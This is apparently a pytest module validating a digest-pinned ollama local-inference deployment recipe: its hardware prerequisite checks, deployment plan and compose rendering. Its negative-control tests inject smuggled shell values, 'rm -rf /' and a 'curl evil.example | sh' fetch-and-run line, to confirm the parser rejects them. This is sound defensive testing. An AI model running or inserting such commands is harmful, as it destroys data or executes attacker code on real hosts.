"""Focused tests for the first local inference recipe (card 11-model-recipe).

The maintained catalogue entry ``catalogue/local-inference.yaml`` is the
user-approved backend/hardware target for self-hosted model serving
(SERVICES row "Optional inference service"): ollama, digest-pinned, serving
the OpenAI-compatible endpoint contract (C09/C03/C06) from a
planner-allocated models volume. This module validates the recipe through
the canonical schema frozen by 08-recipe-schema
(``parse_recipe_text`` -> ``render_recipe`` -> ``build_deployment_plan``),
pins the hardware/VRAM/RAM/disk prerequisite token vocabulary and its
check semantics (the producer definition the executor's
``verify_prerequisites`` operation must implement), and pins the negative
controls that keep the curation load-bearing.

Pure module: no Docker, no network, no I/O beyond the catalogue file.
"""

from __future__ import annotations

import dataclasses
import hashlib
import re
import uuid
from pathlib import Path

import pytest
import yaml

from mai.applications.recipes import (
    MAX_DOCUMENT_BYTES,
    OP_PULL_IMAGE,
    OP_START,
    OP_VERIFY_PREREQUISITES,
    RecipeError,
    RecipeErrorCode,
    RemovalDataPolicy,
    TargetEnvironment,
    ApplicationRecipe,
    PlannedVolume,
    build_deployment_plan,
    canonical_plan_json,
    parse_recipe_text,
    recipe_sha256,
    render_compose,
    render_recipe,
)

#: The catalogue lives at repository root, beside ``backend/``.
REPO_ROOT = Path(__file__).resolve().parents[2]
CATALOGUE_DIR = REPO_ROOT / "catalogue"

INFERENCE_FILE = "local-inference.yaml"

#: The safety-critical pin: registry-verified multi-arch OCI index digest of
#: docker.io/ollama/ollama tag 0.40.6 (linux amd64 + arm64), verified
#: 2026-10-18 against the raw registry (see mai_evidence/11-model-recipe/).
#: The approved v1 target is x86_64-only; aarch64 exists upstream but is
#: deliberately undeclared. Any drift of this pin fails here, loudly.
PINNED_IMAGE = (
    "docker.io/ollama/ollama"
    "@sha256:265409e1d931028a8f7d5a32bcbafddd7bffbc6cc629d77efe9560adf692a5e7"
)

#: Explicit download budget (acceptance 1) as test constants: the recipe's
#: disk token must cover the unpacked image plus the largest approved model
#: weights acquisition plus working headroom. Setup itself downloads nothing
#: (acceptance 2): the plan's operation vocabulary has no weights op.
IMAGE_UNPACKED_GIB = 10
MODEL_ACQUISITION_BUDGET_GIB = 5
DISK_BUDGET_TOKEN = "hw.disk.30gb"

#: The hardware/VRAM/RAM/disk prerequisite token vocabulary for the approved
#: CPU-only v1 target. ``hw.vram.<N>gb`` is RESERVED for a future GPU-target
#: recipe revision and must NOT appear here (the approved target has no GPU
#: requirement). Order is irrelevant; the set is exact.
HARDWARE_PREREQUISITE_VOCABULARY = frozenset(
    {
        "docker",
        "hw.arch.x86_64",
        "hw.cpu.avx2",
        "hw.ram.16gb",
        DISK_BUDGET_TOKEN,
    }
)

#: Token grammar families of the prerequisite schema (documented in the
#: recipe header; enforced here on every curated token).
_HARDWARE_TOKEN_RE = re.compile(r"^hw\.(arch|cpu|ram|vram|disk)\.[a-z0-9_.+-]+$")

_GIB = 1024**3

#: The measured facts of the approved host class (coordinator host,
#: 2026-10-18): x86_64, AVX2, 121.5 GiB RAM, ~499 GiB free at the Docker
#: data root, no NVIDIA GPU (CPU-only target). Feeding these through
#: :func:`evaluate_hardware_checks` must satisfy every declared token.
APPROVED_TARGET_FACTS = {
    "docker_compose_ready": True,
    "arch": "x86_64",
    "cpu_flags": "fpu vme de pse tsc msr pae mce cx8 apic sep mtrr "
    "pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall "
    "nx rdtscp lm constant_tsc arch_perfmon avx2 bmi1 bmi2",
    "ram_bytes": 122 * _GIB,
    "disk_free_bytes": 490 * _GIB,
}

TARGET_X86_64 = TargetEnvironment(os="linux", arch="x86_64")

SERVER_ID = uuid.UUID("11111111-1111-4111-8111-111111111111")
APP_ID = uuid.UUID("0bbbbbbb-0bbb-4bbb-8bbb-bbbbbbbbbbb3")


def _stream_text() -> str:
    return (CATALOGUE_DIR / INFERENCE_FILE).read_text(encoding="utf-8")


def _document_texts() -> list[str]:
    """Split the catalogue file on YAML document boundaries.

    Consumer contract shared with the 08-fixture-recipes test module: the
    catalogue file is a revision stream; consumers parse each document
    separately with ``parse_recipe_text`` (the whole stream text is rejected
    by that parser by design).
    """
    return [yaml.serialize(node) for node in yaml.compose_all(_stream_text())]


def _recipe() -> ApplicationRecipe:
    documents = _document_texts()
    assert len(documents) == 1, "local-inference holds exactly one revision"
    return parse_recipe_text(documents[0])


def _mutant(mutate) -> str:
    """One parseable document with one curated field mutated."""
    document = yaml.safe_load(_document_texts()[0])
    mutate(document)
    return yaml.safe_dump(document)


# ---------------------------------------------------------------------------
# The hardware prerequisite schema: token vocabulary + check semantics
# (producer definition for the executor's verify_prerequisites operation;
# fail-closed: a token that cannot be evaluated counts as NOT satisfied)
# ---------------------------------------------------------------------------


def evaluate_hardware_checks(
    declared: frozenset[str] | set[str], facts: dict[str, object]
) -> frozenset[str]:
    """Return the declared prerequisite tokens the facts do NOT satisfy.

    Check semantics (frozen here as the producer of the vocabulary):
      docker          facts["docker_compose_ready"] is true
      hw.arch.<a>     facts["arch"] equals <a>
      hw.cpu.<f>      facts["cpu_flags"] contains <f> as a whitespace token
      hw.ram.<N>gb    facts["ram_bytes"] >= N GiB
      hw.vram.<N>gb   facts["vram_bytes"] >= N GiB (reserved; never declared
                      by the CPU-only v1 recipe)
      hw.disk.<N>gb   facts["disk_free_bytes"] >= N GiB
    """
    unsatisfied: set[str] = set()
    for token in sorted(declared):
        if token == "docker":
            if facts.get("docker_compose_ready") is not True:
                unsatisfied.add(token)
            continue
        match = _HARDWARE_TOKEN_RE.fullmatch(token)
        if match is None:
            # Outside the frozen families: a check the executor cannot
            # interpret must fail closed, never silently pass.
            unsatisfied.add(token)
            continue
        family = match.group(1)
        spec = token.removeprefix(f"hw.{family}.")
        if family == "arch":
            if facts.get("arch") != spec:
                unsatisfied.add(token)
        elif family in ("cpu",):
            flags = facts.get("cpu_flags", "")
            satisfied = isinstance(flags, str) and spec in flags.split()
            if not satisfied:
                unsatisfied.add(token)
        else:
            try:
                budget = int(spec.removesuffix("gb"))
            except ValueError:
                unsatisfied.add(token)
                continue
            key = {
                "ram": "ram_bytes",
                "vram": "vram_bytes",
                "disk": "disk_free_bytes",
            }[family]
            value = facts.get(key)
            if not isinstance(value, int) or value < budget * _GIB:
                unsatisfied.add(token)
    return frozenset(unsatisfied)


# ---------------------------------------------------------------------------
# AC1: the user-approved recipe validates through the canonical schema
# ---------------------------------------------------------------------------


def test_catalogue_file_is_a_single_revision_within_document_bounds() -> None:
    text = _stream_text()
    assert len(_document_texts()) == 1
    assert len(text.encode()) <= MAX_DOCUMENT_BYTES


def test_recipe_pins_the_approved_image_and_target() -> None:
    recipe = _recipe()
    assert recipe.image == PINNED_IMAGE
    assert recipe.name == "local-inference"
    assert recipe.supported_environment.os == ("linux",)
    # The approved v1 hardware target is x86_64-only; aarch64 planning is
    # refused at plan time (asserted below) even though the upstream index
    # also carries arm64.
    assert recipe.supported_environment.arch == ("x86_64",)


def test_recipe_round_trips_through_canonical_rendering() -> None:
    recipe = _recipe()
    rendered = render_recipe(recipe)
    reparsed = parse_recipe_text(rendered)
    assert reparsed == recipe
    assert render_recipe(reparsed) == rendered
    assert recipe_sha256(recipe) == recipe_sha256(reparsed)


def test_prerequisites_are_exactly_the_approved_hardware_vocabulary() -> None:
    recipe = _recipe()
    assert frozenset(recipe.prerequisites) == HARDWARE_PREREQUISITE_VOCABULARY
    assert recipe.required_grants == ("docker.compose",)
    for token in recipe.prerequisites:
        assert _HARDWARE_TOKEN_RE.fullmatch(token) or token == "docker"
    # The reserved VRAM family stays out of the CPU-only approved target.
    assert not any(token.startswith("hw.vram.") for token in recipe.prerequisites)


def test_download_budget_constants_are_consistent_with_the_disk_token() -> None:
    budget = int(DISK_BUDGET_TOKEN.removeprefix("hw.disk.").removesuffix("gb"))
    assert budget == 30
    assert budget >= IMAGE_UNPACKED_GIB + MODEL_ACQUISITION_BUDGET_GIB


def test_approved_host_facts_satisfy_every_declared_check() -> None:
    recipe = _recipe()
    assert (
        evaluate_hardware_checks(
            frozenset(recipe.prerequisites), dict(APPROVED_TARGET_FACTS)
        )
        == frozenset()
    )


@pytest.mark.parametrize(
    ("facts", "extra_declared", "expected_unsatisfied"),
    [
        # Disposable-target discipline facts (C10: <= 2 GiB) fail the RAM
        # budget: the recipe must refuse weak fixtures before deployment.
        (
            {**APPROVED_TARGET_FACTS, "ram_bytes": 2 * _GIB},
            frozenset(),
            frozenset({"hw.ram.16gb"}),
        ),
        # A pre-AVX2 x86_64 host fails the CPU feature check.
        (
            {**APPROVED_TARGET_FACTS, "cpu_flags": "fpu mmx sse sse2"},
            frozenset(),
            frozenset({"hw.cpu.avx2"}),
        ),
        # A small disk fails the explicit download budget check.
        (
            {**APPROVED_TARGET_FACTS, "disk_free_bytes": 20 * _GIB},
            frozenset(),
            frozenset({DISK_BUDGET_TOKEN}),
        ),
        # A non-x86_64 arch fails the executor-side arch mirror.
        (
            {**APPROVED_TARGET_FACTS, "arch": "aarch64"},
            frozenset(),
            frozenset({"hw.arch.x86_64"}),
        ),
        # Fail-closed: a declared token outside the frozen families (e.g. a
        # future revision inventing one) is never silently satisfied.
        (
            {**APPROVED_TARGET_FACTS},
            frozenset({"hw.quantum.qubits64"}),
            frozenset({"hw.quantum.qubits64"}),
        ),
        # Missing fact dimensions fail the matching check.
        (
            {k: v for k, v in APPROVED_TARGET_FACTS.items() if k != "disk_free_bytes"},
            frozenset(),
            frozenset({DISK_BUDGET_TOKEN}),
        ),
    ],
)
def test_unsupported_hardware_fails_the_matching_checks(
    facts: dict[str, object],
    extra_declared: frozenset[str],
    expected_unsatisfied: frozenset[str],
) -> None:
    recipe = _recipe()
    declared = frozenset(recipe.prerequisites) | extra_declared
    unsatisfied = evaluate_hardware_checks(declared, facts)
    assert unsatisfied == expected_unsatisfied


# ---------------------------------------------------------------------------
# Plan binding: policy-bound, bounded, endpoint-honest (C09 rule 3)
# ---------------------------------------------------------------------------


def test_plan_is_fully_bound_and_deterministic() -> None:
    recipe = _recipe()
    plan = build_deployment_plan(recipe, SERVER_ID, APP_ID, TARGET_X86_64)
    assert plan.image == PINNED_IMAGE
    assert plan.recipe_sha256 == recipe_sha256(recipe)
    assert plan.target_os == "linux" and plan.target_arch == "x86_64"
    assert plan.project_name == f"mai-app-{APP_ID.hex}"
    assert plan.compose_path == f"/var/lib/mai/apps/{APP_ID}/compose.yaml"
    assert plan.credentials_path is None and plan.credentials == ()
    assert plan.health_probe is None
    assert plan.prerequisites == tuple(sorted(HARDWARE_PREREQUISITE_VOCABULARY))
    assert plan.ports[0].host == 18114 and plan.ports[0].container == 11434
    assert plan.volumes == (
        PlannedVolume(
            name="models",
            container_path="/root/.ollama",
            host_path=f"/var/lib/mai/apps/{APP_ID}/volumes/models",
        ),
    )
    rebuilt = build_deployment_plan(recipe, SERVER_ID, APP_ID, TARGET_X86_64)
    assert rebuilt == plan
    assert rebuilt.plan_sha256 == plan.plan_sha256
    assert (
        plan.plan_sha256
        == hashlib.sha256(canonical_plan_json(plan).encode("utf-8")).hexdigest()
    )


def test_plan_verifies_prerequisites_before_any_download_or_start() -> None:
    recipe = _recipe()
    plan = build_deployment_plan(recipe, SERVER_ID, APP_ID, TARGET_X86_64)
    ops = [operation.op for operation in plan.operations]
    # Frozen op order: verify_prerequisites is the FIRST operation, and the
    # only effects after it are the bounded install vocabulary. There is no
    # model-weights/download operation at all (acceptance 2: no mandatory
    # large download; unsupported hardware fails BEFORE pull_image/start).
    assert ops[0] == OP_VERIFY_PREREQUISITES
    assert ops[1:] == [
        "create_directories",
        "write_compose",
        OP_PULL_IMAGE,
        OP_START,
    ]
    assert plan.operations[0].subject == ",".join(
        sorted(HARDWARE_PREREQUISITE_VOCABULARY)
    )
    assert OP_START in ops and "download_weights" not in ops


def test_plan_refuses_unsupported_targets_before_any_effect() -> None:
    recipe = _recipe()
    with pytest.raises(RecipeError) as arch_exc:
        build_deployment_plan(
            recipe,
            SERVER_ID,
            APP_ID,
            TargetEnvironment(os="linux", arch="aarch64"),
        )
    assert arch_exc.value.code is RecipeErrorCode.UNSUPPORTED_TARGET_ARCH
    with pytest.raises(RecipeError) as os_exc:
        build_deployment_plan(
            recipe,
            SERVER_ID,
            APP_ID,
            TargetEnvironment(os="windows", arch="x86_64"),
        )
    assert os_exc.value.code is RecipeErrorCode.UNSUPPORTED_TARGET_OS


def test_plan_marks_the_openai_endpoint_unverified_honestly() -> None:
    recipe = _recipe()
    plan = build_deployment_plan(recipe, SERVER_ID, APP_ID, TARGET_X86_64)
    # The pinned image contains no curl, so the recipe declares NO health
    # section and the plan carries the schema's frozen honest-absence
    # limitation instead of a probe that could never pass.
    assert plan.health_probe is None
    assert (
        "no declared health verification; deployment success is unverified"
        in plan.limitations
    )
    assert any("keeps all persistent data" in limit for limit in plan.limitations)


def test_compose_is_digest_pinned_shell_free_and_volume_bound() -> None:
    recipe = _recipe()
    plan = build_deployment_plan(recipe, SERVER_ID, APP_ID, TARGET_X86_64)
    text = plan.compose_text
    assert "healthcheck" not in yaml.safe_load(text)["services"]["local-inference"]
    assert "env_file" not in text
    for forbidden in ("$", "CMD-SHELL", "/bin/sh", "sh -c"):
        assert forbidden not in text
    document = yaml.safe_load(text)
    service = document["services"]["local-inference"]
    assert service["image"] == PINNED_IMAGE
    assert service["ports"] == ["18114:11434/tcp"]
    assert service["volumes"] == [
        f"/var/lib/mai/apps/{APP_ID}/volumes/models:/root/.ollama"
    ]
    assert service["restart"] == "unless-stopped"
    assert document["name"] == f"mai-app-{APP_ID.hex}"


def test_removal_keeps_model_weights_and_needs_no_backup() -> None:
    recipe = _recipe()
    plan = build_deployment_plan(recipe, SERVER_ID, APP_ID, TARGET_X86_64)
    assert recipe.removal.data_policy is RemovalDataPolicy.KEEP
    assert recipe.backup.required is False
    assert recipe.update.migrations.value == "none"
    assert all(op.op != "require_backup" for op in plan.operations)


def test_plan_mutation_is_bound_to_the_recipe_revision() -> None:
    recipe = _recipe()
    plan = build_deployment_plan(recipe, SERVER_ID, APP_ID, TARGET_X86_64)
    other_digest = PINNED_IMAGE.replace("265409e1", "065409e1")
    mutated = dataclasses.replace(recipe, image=other_digest)
    other_plan = build_deployment_plan(mutated, SERVER_ID, APP_ID, TARGET_X86_64)
    assert recipe_sha256(mutated) != recipe_sha256(recipe)
    assert other_plan.plan_sha256 != plan.plan_sha256


# ---------------------------------------------------------------------------
# Negative controls: the curation is load-bearing
# ---------------------------------------------------------------------------


def test_tag_mutant_image_is_rejected_unpinned() -> None:
    def tag_image(document: dict[str, object]) -> None:
        document["deploy"]["image"] = "docker.io/ollama/ollama:0.40.6"

    with pytest.raises(RecipeError) as excinfo:
        parse_recipe_text(_mutant(tag_image))
    assert excinfo.value.code is RecipeErrorCode.UNPINNED_IMAGE


def test_corrupted_digest_mutant_image_is_rejected() -> None:
    def corrupt_digest(document: dict[str, object]) -> None:
        document["deploy"]["image"] = PINNED_IMAGE[:-1]  # 63 hex digits

    with pytest.raises(RecipeError) as excinfo:
        parse_recipe_text(_mutant(corrupt_digest))
    assert excinfo.value.code is RecipeErrorCode.INVALID_IMAGE


@pytest.mark.parametrize(
    "field",
    ["hooks", "install_script", "pre_start", "entrypoint", "command"],
)
def test_shell_smuggling_top_level_fields_are_unknown(field: str) -> None:
    def inject(document: dict[str, object]) -> None:
        document[field] = "rm -rf /"

    with pytest.raises(RecipeError) as excinfo:
        parse_recipe_text(_mutant(inject))
    assert excinfo.value.code is RecipeErrorCode.UNKNOWN_FIELD


def test_shell_smuggling_deploy_field_is_unknown() -> None:
    def inject(document: dict[str, object]) -> None:
        document["deploy"]["post_start"] = ["curl evil.example | sh"]

    with pytest.raises(RecipeError) as excinfo:
        parse_recipe_text(_mutant(inject))
    assert excinfo.value.code is RecipeErrorCode.UNKNOWN_FIELD


def test_delete_removal_policy_is_rejected() -> None:
    def force_delete(document: dict[str, object]) -> None:
        document["removal"]["data_policy"] = "delete"

    with pytest.raises(RecipeError) as excinfo:
        parse_recipe_text(_mutant(force_delete))
    assert excinfo.value.code is RecipeErrorCode.DATA_DELETE_FORBIDDEN


@pytest.mark.parametrize(
    "token", ["rm -rf", "hw.ram.16GB", "-hw.ram", "hw/ram/16gb", "HW.cpu.avx2"]
)
def test_out_of_grammar_prerequisite_tokens_are_rejected(token: str) -> None:
    def add_token(document: dict[str, object]) -> None:
        document["prerequisites"].append(token)

    with pytest.raises(RecipeError) as excinfo:
        parse_recipe_text(_mutant(add_token))
    assert excinfo.value.code is RecipeErrorCode.INVALID_PREREQUISITE


def test_out_of_vocabulary_prerequisite_is_caught_by_the_vocabulary_pin() -> None:
    """A well-formed but unapproved check token parses at schema level and
    MUST be caught by the curated-vocabulary pin, not by the schema."""

    def add_gpu_requirement(document: dict[str, object]) -> None:
        document["prerequisites"].append("hw.vram.8gb")

    recipe = parse_recipe_text(_mutant(add_gpu_requirement))
    assert frozenset(recipe.prerequisites) != HARDWARE_PREREQUISITE_VOCABULARY


def test_credentials_cannot_carry_values() -> None:
    def value_map(document: dict[str, object]) -> None:
        document["deploy"]["credentials"] = {"OLLAMA_API_KEY": "sk-value"}

    with pytest.raises(RecipeError) as excinfo:
        parse_recipe_text(_mutant(value_map))
    assert excinfo.value.code is RecipeErrorCode.INVALID_CREDENTIAL_REFERENCE


def test_health_mutant_would_render_an_impossible_curl_probe() -> None:
    """The schema renders any declared health section as an argv curl
    healthcheck; the pinned image has no curl (verified curation fact), so
    the curated recipe must keep health absent — the mutant documents what
    declaring it would silently break."""

    def add_health(document: dict[str, object]) -> None:
        document["health"] = {
            "kind": "http",
            "port": 11434,
            "path": "/",
            "expected_status": 200,
        }

    recipe = parse_recipe_text(_mutant(add_health))
    compose_text = render_compose(recipe, APP_ID)
    healthcheck = yaml.safe_load(compose_text)["services"]["local-inference"][
        "healthcheck"
    ]
    assert healthcheck["test"][0:2] == ["CMD", "curl"]
    # The curated recipe itself has no health section and no healthcheck.
    curated = render_compose(_recipe(), APP_ID)
    assert "healthcheck" not in curated
